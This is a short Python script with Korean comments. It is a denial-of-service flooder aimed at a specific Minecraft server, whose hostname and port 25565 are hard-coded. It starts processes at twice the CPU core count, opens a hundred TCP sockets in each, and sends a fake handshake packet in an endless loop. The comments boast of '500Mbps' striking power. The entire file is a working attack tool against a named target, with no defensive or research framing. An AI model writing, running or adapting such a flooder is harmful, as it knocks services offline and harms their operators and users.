import socket
import multiprocessing
import time

target_host = "mabang.kro.kr"
target_port = 25565
# 500Mbps 타격력을 위해 프로세스 수를 CPU 코어의 2배로 설정
process_count = multiprocessing.cpu_count() * 2


def create_raw_packet():
    # 미리 인코딩된 마인크래프트 핸드셰이크 바이너리 데이터
    # (매번 계산하지 않도록 미리 상수로 선언)
    return b'\x15\x00\xfb\x05\rmabang.kro.krcd\x02\x15\x00\tFakeUser\x00'


def ultra_burst(start_signal):
    packet = create_raw_packet()
    start_signal.wait()  # 모든 프로세스 동시 출발 신호

    sockets = []
    # 1단계: 미리 100개의 소켓을 연결해둠 (연결 확보)
    for _ in range(100):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # 지연 방지
            s.settimeout(1.0)
            s.connect((target_host, target_port))
            sockets.append(s)
        except:
            continue

    # 2단계: 확보된 소켓들에 무한 연사
    while True:
        for s in sockets:
            try:
                s.send(packet)  # 미친 듯이 패킷 주입
            except:
                sockets.remove(s)  # 끊긴 소켓은 제거
                break


if __name__ == "__main__":
    manager = multiprocessing.Manager()
    start_signal = manager.Event()

    print(f"[*] 500Mbps 모드 가동 중... 프로세스 {process_count}개 생성")

    pool = []
    for _ in range(process_count):
        p = multiprocessing.Process(target=ultra_burst, args=(start_signal,))
        p.start()
        pool.append(p)

    time.sleep(5)  # 엔진 예열
    print("🔥 에너지파 발사!!! 작업 관리자를 확인하세요.")
    start_signal.set()

    for p in pool:
        p.join()